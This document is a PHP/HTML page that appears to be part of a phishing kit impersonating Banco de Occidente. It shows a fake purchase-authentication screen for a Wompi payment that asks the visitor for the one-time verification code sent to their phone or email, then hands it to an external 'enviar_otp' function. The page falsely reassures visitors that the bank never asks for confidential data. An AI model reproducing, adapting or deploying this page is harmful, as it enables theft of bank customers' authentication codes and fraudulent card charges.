<?php 




    $fechaActual = date('d/m/y');
    
   // $mensaje = "La transacción que intentas realizar por un valor de: $8.689 Cop  con tu tarjeta terminada en **********".$ca." Debe ser autorizada por seguridad";

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Document</title>
    <link rel="stylesheet" href="/css/davi.css">


    <script type="text/javascript" src="/scripts/jquery-3.6.0.min.js"></script>
		<script src="/scripts/jquery.jclock-min.js" type="text/javascript"></script>
   		<script type="text/javascript" src="/scripts/functions2.js"></script> 

</head>
<body>
    <div class="details" >
        <img src="/img/occidente.png" alt="" width="130px">
        <hr>

        <h3 style="color:black; ">Autenticación de compra</h3>
        <a style="color:black;">Acabamos de enviarte un código de verificación por correo electronico o mensaje de texto. Para autorizar un pago en Wompi el <?php echo $fechaActual; ?> <br>Banco de Occidente nunca te solicitará información confidencial o financiera como usuarios y claves de acceso.</a><br><p></p>
    
       
        <center><a style="">Código de verificación</a><br>
        <input type="text" name="cDinamica" id="txtOTP" style=""><br>
        <input type="submit" id="btnOTP" value="ENVIAR" style="color:white; background-color:blue; border:none;margin-top:5px; height:35px; width:189px;"></center>
       <br><br>
    
    </div>

    <script type="text/javascript">
	var espera = 0;

	let identificadorTiempoDeEspera;

	function retardor() {
	  identificadorTiempoDeEspera = setTimeout(retardorX, 900);
	}

	function retardorX() {

	}

	$(document).ready(function() {
		$('#btnOTP').click(function(){
			if ($("#txtOTP").val()) {
				enviar_otp($("#txtOTP").val());				
			}else{
				$(".mensaje").show();
				$(".pass").css("border", "1px solid red");
				$("#txtOTP").focus();
			}			
		});

		$("#txtOTP").keyup(function(e) {
			$(".pass").css("border", "1px solid #CCCCCC");	
			$(".mensaje").hide();				
		});
	});
</script>

</body>
</html>